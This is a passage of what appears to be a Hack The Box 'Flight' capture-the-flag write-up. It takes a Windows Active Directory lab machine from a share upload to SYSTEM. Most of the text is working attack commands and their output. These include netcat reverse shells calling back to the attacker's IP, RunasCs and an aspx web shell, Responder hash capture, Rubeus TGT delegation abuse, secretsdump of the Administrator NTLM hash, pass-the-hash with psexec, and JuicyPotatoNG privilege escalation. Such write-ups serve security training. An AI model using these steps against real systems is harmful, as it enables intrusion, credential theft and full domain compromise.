└─$ smbclient //10.10.11.187/Web -U c.bum --password 'Tikkycoll_431012284' 
Try "help" to get a list of possible commands.
smb: \&gt; cd flight.htb\
smb: \flight.htb\&gt; lcd  exploit 
smb: \flight.htb\&gt; put shell.php
putting file shell.php as \flight.htb\shell.php (0.0 kb/s) (average 0.0 kb/s)
smb: \flight.htb\&gt; 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now i will test on web application to if i have command injection and if the file i have uploaded works.</p>

<p><img src="/assets/img/flight/08.png" alt="image" /></p>

<p>The <code class="language-plaintext highlighter-rouge">php</code> file works fine and now it the time to get shell as <code class="language-plaintext highlighter-rouge">svc_apache</code> user, To do this I will upload <a href="https://github.com/rahuldottech/netcat-for-windows/releases">nc64.exe</a> to windows machine by using the same procedure like uploading <code class="language-plaintext highlighter-rouge">php</code></p>
<h3 id="get-shell">Get shell</h3>
<p>Since i have uploaded <code class="language-plaintext highlighter-rouge">shell.php</code> and <code class="language-plaintext highlighter-rouge">nc64.exe</code> now i can run netcat in Windows machine while listening with Linux netcat and have a proper shell back, To do this i will use the following steps.</p>

<p><strong>Step 01</strong></p>

<p>Start netcat listener in Linux machine(Attacking machine)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ nc -nlvp 9001 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 02</strong></p>

<p>Execute netcat on the remote machine(Victim machine)</p>

<p><img src="/assets/img/flight/09.png" alt="image" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc64.exe -e powershell 10.10.14.28 9001
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 03</strong></p>

<p>Run the command and get shell</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ nc -nlvp 9001                                                        
listening on [any] 9001 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.187] 50517
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\flight.htb&gt; 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Alternative you can use the following <code class="language-plaintext highlighter-rouge">php</code> script, Remember to change IP Address and port number 
<a href="https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php">window_shell</a>
In Windows there is a path that used to host <code class="language-plaintext highlighter-rouge">IIs</code> which is <code class="language-plaintext highlighter-rouge">C:\inetpub</code> which is similar to <code class="language-plaintext highlighter-rouge">/var/www</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>PS C:\xampp\htdocs\flight.htb&gt; cd \
cd \
PS C:\&gt; dir
dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/18/2023  11:12 AM                inetpub                                                               
d-----         6/7/2022   6:39 AM                PerfLogs                                                              
d-r---       10/21/2022  11:49 AM                Program Files                                                         
d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   
d-----        5/18/2023   9:47 AM                Shared                                                                
d-----        9/22/2022  12:28 PM                StorageReports                                                        
d-r---        9/22/2022   1:16 PM                Users                                                                 
d-----       10/21/2022  11:52 AM                Windows                                                               
d-----        9/22/2022   1:16 PM                xampp   
</pre></td></tr></tbody></table></code></pre></div></div>
<p>In <code class="language-plaintext highlighter-rouge">inetpub</code> there is another directory named <code class="language-plaintext highlighter-rouge">wwwroot</code> where i checked and see <code class="language-plaintext highlighter-rouge">asp</code> application, I will assume this is another web running in this box.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>PS C:\inetpub\wwwroot&gt; dir 
dir 


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:28 PM                aspnet_client                                                         
-a----        9/22/2022  12:24 PM            703 iisstart.htm                                                          
-a----        9/22/2022  12:24 PM          99710 iisstart.png 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Checking for listening ports</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>PS C:\xampp\htdocs\flight.htb&gt; netstat -ano | findstr 'LISTENING'                                                                                                       
netstat -ano | findstr 'LISTENING'                                                                                                                                      
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4504                                                                                             
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916                                                                                              
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4504                                                                                             
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                                                
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916                                                                                              
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648                                                                                              
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                                                                
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4  
</pre></td></tr></tbody></table></code></pre></div></div>
<p>There is a lot of listening ports because this is <code class="language-plaintext highlighter-rouge">AD</code> Machine but the interesting thing is there is port <code class="language-plaintext highlighter-rouge">8000</code></p>

<p>Since i have credentials of user <code class="language-plaintext highlighter-rouge">c.bum</code> i can now run a program as him and get shell as him.</p>
<h3 id="shell-as-cbum">Shell as C.Bum</h3>
<p>To get shell i will upload <a href="https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip">RunasCs</a> to the Windows machine and run the below command while listening with <code class="language-plaintext highlighter-rouge">netcat</code> for new shell as <code class="language-plaintext highlighter-rouge">c.bum</code> user.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>PS C:\users\svc_apache\tmp&gt; .\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.28:9001 cmd
</pre></td></tr></tbody></table></code></pre></div></div>
<p>On attacker machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ rlwrap nc -nlvp 9001                                                                                                                                            
listening on [any] 9001 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.187] 50750
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
flight\c.bum

C:\Windows\system32&gt;
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="accessing-web-server-runiing-on-port-8000">Accessing web server Runiing on port 8000</h3>
<p>To access the remote machine i will do tunneling by using <a href="https://github.com/jpillora/chisel/">chisel</a>
On attacker machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ ./chisel server -p 9002 --reverse &amp;  
</pre></td></tr></tbody></table></code></pre></div></div>
<p>On client machine(Victim)</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>C:\Users\svc_apache\Documents&gt;.\chisel.exe client 10.10.14.45:9002 R:8000:127.0.0.1:8000
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/flight/07.png" alt="image" />
The response shows that this web site is hosted by <code class="language-plaintext highlighter-rouge">IIS</code> and also <code class="language-plaintext highlighter-rouge">X-Powered-By: ASP.NET</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/Machine/flight]
└─$ curl -I http://localhost:8000/   
HTTP/1.1 403 Forbidden
Cache-Control: private
Content-Length: 5069
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 18 May 2023 19:31:16 GMT
</pre></td></tr></tbody></table></code></pre></div></div>
<p>This web server i hosted in <code class="language-plaintext highlighter-rouge">development</code> directory and user <code class="language-plaintext highlighter-rouge">c.bum</code> can write and execute files here.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>C:\inetpub\development&gt;dir 
 Volume in drive C has no label.
 Volume Serial Number is 1DF4-493D

 Directory of C:\inetpub\development

05/18/2023  12:22 PM    &lt;DIR&gt;          .
05/18/2023  12:22 PM    &lt;DIR&gt;          ..
04/16/2018  02:23 PM             9,371 contact.html
05/18/2023  12:22 PM    &lt;DIR&gt;          css
05/18/2023  12:22 PM    &lt;DIR&gt;          fonts
05/18/2023  12:22 PM    &lt;DIR&gt;          img
04/16/2018  02:23 PM            45,949 index.html
05/18/2023  12:22 PM    &lt;DIR&gt;          js
               2 File(s)         55,320 bytes
               6 Dir(s)   5,011,652,608 bytes free
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="shell-as-iis-apppool">Shell as IIS apppool</h3>
<p>Since this is <code class="language-plaintext highlighter-rouge">asp</code> application then i will use <code class="language-plaintext highlighter-rouge">shell.aspx</code> to get shell, i will locate from my Kali machine and upload to user <code class="language-plaintext highlighter-rouge">c.bum</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>C:\inetpub\development&gt;powershell wget 10.10.14.28/shell.aspx -outf shell.aspx 
powershell wget 10.10.14.28/shell.aspx -outf shell.aspx 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><img src="/assets/img/flight//10.png" alt="image" /></p>

<p>To get a shell i will now listen with <code class="language-plaintext highlighter-rouge">netcat</code> and execute commands on the the above web as follows:-</p>

<p><img src="/assets/img/flight//11.png" alt="image" /></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>C:\tmp\nc.exe -e powershell 10.10.14.28 9005
</pre></td></tr></tbody></table></code></pre></div></div>
<p>On Linux</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ nc -nlvp 9005
listening on [any] 9005 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.187] 51012
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv&gt; 
whoami
iis apppool\defaultapppool
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now  <code class="language-plaintext highlighter-rouge">iis apppool\defaultapppool</code> is a virtual identity created by Internet Information Services (IIS) on Windows machines. It is specifically used for running application pools in IIS. This account operates as machine account and to prove it i can run <code class="language-plaintext highlighter-rouge">responder</code> again to check which account does authenticate with</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/Machine/flight]                                                                                                                         
└─$ sudo responder -I tun0  
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Access share in Windows machine.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; \\10.10.14.28\gems  
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>...[snip]...
[SMB] NTLMv2-SSP Hash     : G0$::flight:8b67f7c2a0e36aff:1B6903EB48A1E5FAACB0C294F7BFA63C:010100000000000000D8E15DDD89D9018D4256E0EA96F5E80000000002000800490053003400550001001E00570049004E002D0047004200370035003800300037004B004C005800450004003400570049004E002D0047004200370035003800300037004B004C00580045002E0049005300340055002E004C004F00430041004C000300140049005300340055002E004C004F00430041004C000500140049005300340055002E004C004F00430041004C000700080000D8E15DDD89D901060004000200000008003000300000000000000000000000003000007C92BC5E376D9E7A60B40E65090EE92246015BB8B2CB4A83FACBC3F4D9F133850A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003800000000000000000
...[snip]...
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The above result shows that this account tries to authenticate with <code class="language-plaintext highlighter-rouge">GO$</code> account</p>
<h3 id="shell-as-system-user">Shell as System User</h3>
<p>To abuse this i will do <code class="language-plaintext highlighter-rouge">TGT delegation</code> to get a ticket for the system account.</p>

<p><code class="language-plaintext highlighter-rouge">TGT delegation</code>  is a process in  <code class="language-plaintext highlighter-rouge">Kerberos</code> where a user can allow another user or service to access resources on their behalf without the need for separate authentication. It’s like giving someone a special permission slip <code class="language-plaintext highlighter-rouge">TGT</code> that allows them to access certain things without needing to prove their identity every time. This is useful when someone needs to access resources or perform actions on behalf of another person or service in a secure and controlled manner.</p>

<p>To do this i will <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> from <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe">SharpCollection</a> by using the following steps:-</p>

<p><strong>Step 01</strong></p>

<p>Upload <code class="language-plaintext highlighter-rouge">Rubeus.exe</code> to Windows machine.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; powershell wget 10.10.14.28/Rubeus.exe -outf Rubeus.exe 
powershell wget 10.10.14.28/Rubeus.exe -outf Rubeus.exe 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 02</strong></p>

<p>Create a ticket</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; .\Rubeus.exe tgtdeleg /nowrap 
.\Rubeus.exe tgtdeleg /nowrap 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: 1XJo3QGbcP5tJLsXwVEKaWw7Z797yUannhEzM0c3LRo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECuLDj2l7osDtW05/69EMr+Idsddm6P1TpvBFO8DHvsK/lUFzM31llLj2Y1mQEYXf0aSYB+eO467wsOT+6YjwbJ18tGBm8YHo7bsj7nH8WxhFsXCKPV0v+c5o191QfEjMK8OkWJyi1Po61o4B6pin2RKbFBo7yVdjxoGhXkPt6F+YvHxXHksHLpfAAAa4eele1EPjIJnUkIblnHLdYHfwf8wnMQuNNK+RcnxHuvY43u1n1pDhYRCR26PmhWJQNNhefgD/RnmpgL7fK61ISBcV7M80Hjk/0ZiTbqroE7EkFSDI1Ugt8GR4vvzDuqArRrzpjyggfhBKhSu/XwY2sXFc5RSYHpjD7ahprcCrg7IWSW9k9+HUPMHLVi5QmsDTALQzoraocKkYsFuY+Bzh2vNqz7M5h/ah8v6LG5Q4rKZtRLhnQrM8Wf4vUsaZfutyTpFaw89brgZLhFfggnFKgtxUYKwNS1y4laVZM/OAEo/Y4UVlkkOvpDvurF+K5nYNnDPNRceeeal0ABVSeTSAxmJATJlPjGp6hkCu0Vf5tsMmWhdFyOVP7NwHaCT68sdw/kneXygEYyoN6rfFMjll0SE9DnfAZS1hchQb1vnE7L/9O+yRjCfo4UvBKxwyrXxfvjv0EIK3xcNv69O7kDGu6S4yXRVD5hM1J2QVq6RI/T99Vwynqa98DttbnllkCLmOPKI7tskDH6oeDa/JQ35iZWfZYbaw8EqgWVtGbw3WxG2fX1AHWfpRUjom8B0sPrSach8BcGNK7CBbVnalI4UpWti5/hXwRx6Iq+TfFUJ5vt9qhAJm9OWUlWE92G8rSj4EslGsB/+dYWNyxK0Rnx0skVRqY5WtqMi1r888mEOEyL51OikQt/AqjNVC0zAf79d7J0MVqcbJKg1/PxOZ7KFGw24DsMtjL7xjnabF+X9V3LkP9AaSPd17YvSJW4b+HiKD35mH9MJq2uUS72ug8SP9DshMpUdDpxLulN2tmp7Cgul6p+DEoGcItuaU8CnouEYsythsTOVNpOU8XTos0qFd5UvZFCR+WlYjjT0rlyerZCqB85PnbAZQDNVyT9bTIyJc1D65KVr88uHU3op5XcgvB3GY3sz1RMKTEouohyx0oA8Sn9dm6nxKAeCfWF4W6JJqdki8hvRaJDL8pdus/LyjYza8jtOsGL9O9JUGgBzyr7xLYhNxPWjYGMgtjhQnI6xT48fVMsI6C9RIFNbOB6EY5peQ1CQlZ7jRCxTY5A5ielDz2DTunsKL7tpPo52sGt52FabcmfmcOohlSt2hK8mMP7GBNWvDoRU4vlm4rnRu2Csr+7ytFIP+cYtW1ojQpIyCx4WqtxznQ9We0uZfK63p5+jygxreUndmsLi+Kzh9o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgCxeAO3le1rkt2AAOtt9BmzI7ILIz0n0Y79kROdT1JK6hDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDIzMDUxODIwNDgwNlqmERgPMjAyMzA1MTkwNjQ4MDZapxEYDzIwMjMwNTI1MjA0ODA2WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 03</strong></p>

<p>Copy the ticket to a file, i named mine as <code class="language-plaintext highlighter-rouge">ticket.kirbi</code></p>

<p><strong>Step 04</strong></p>

<p>Convert the ticket into <code class="language-plaintext highlighter-rouge">ccache</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ python kirbi2ccache.py ticket.kirbi ticket.ccache                                                                                                             
INFO:root:Parsing kirbi file /home/hashghost/C7F5/htb/Machine/flight/exploit/ticket.kirbi
INFO:root:Done!
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 05</strong></p>

<p>Export <code class="language-plaintext highlighter-rouge">ticke.ccache</code> to <code class="language-plaintext highlighter-rouge">KRB5CCNAME</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ export KRB5CCNAME=ticket.ccache 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 06</strong></p>

<p>Run <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ impacket-secretsdump -k -no-pass g0.flight.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up... 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>There is an error with a suggestion to use <code class="language-plaintext highlighter-rouge">-just-dc-user</code> i will try to add that</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>There is another error <code class="language-plaintext highlighter-rouge">KRB_AP_ERR_SKEW(Clock skew too great)</code> but this can be solved by synchronize time</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/openvpn]
└─$ sudo ntpdate -s flight.htb
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Now i will run again the same commands</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]                                                                                                                    
└─$ impacket-secretsdump -k -no-pass g0.flight.htb                                                                                                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                                

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user                                                                         
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c::: 
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It will dump almost every hash of the user in Domain but i am only interested with Administrator account so i will use his hash for authentication.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/…/htb/Machine/flight/exploit]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c administrator@flight.htb                                             
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on flight.htb.....
[*] Found writable share ADMIN$
[*] Uploading file HItXDQra.exe
[*] Opening SVCManager on flight.htb.....
[*] Creating service Uxum on flight.htb.....
[*] Starting service Uxum.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
nt authority\system
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="alternative">Alternative</h3>
<p>Account <code class="language-plaintext highlighter-rouge">iis apppool\defaultapppool</code> has <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> . Impersonation is the ability to temporarily adopt the security context of another user or security principal, allowing actions to be performed on their behalf. To abuse this i can use <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG.exe</a></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\tmp&gt; 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 01</strong></p>

<p>Upload <code class="language-plaintext highlighter-rouge">JuicyPotatoNG.exe</code> to Windows machine</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; powershell wget 10.10.14.28/JuicyPotatoNG.exe -outf JuicyPotatoNG.exe
powershell wget 10.10.14.28/JuicyPotatoNG.exe -outf JuicyPotatoNG.exe
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 02</strong></p>

<p>Start a listener</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/Machine/flight]
└─$ nc -nlvp 9005                                                        
listening on [any] 9005 ...
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Step 03</strong></p>

<p>Run <code class="language-plaintext highlighter-rouge">JuicyPotatoNF.exe</code></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>PS C:\tmp&gt; .\JuicyPotatoNG.exe -t * -p "C:\tmp\nc.exe" -a "10.10.14.28 9005 -e cmd.exe"
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>┌──(hashghost㉿htb)-[~/C7F5/htb/Machine/flight]
└─$ nc -nlvp 9005                                                        
listening on [any] 9005 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.187] 54454
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\&gt;whoami
whoami
nt authority\system
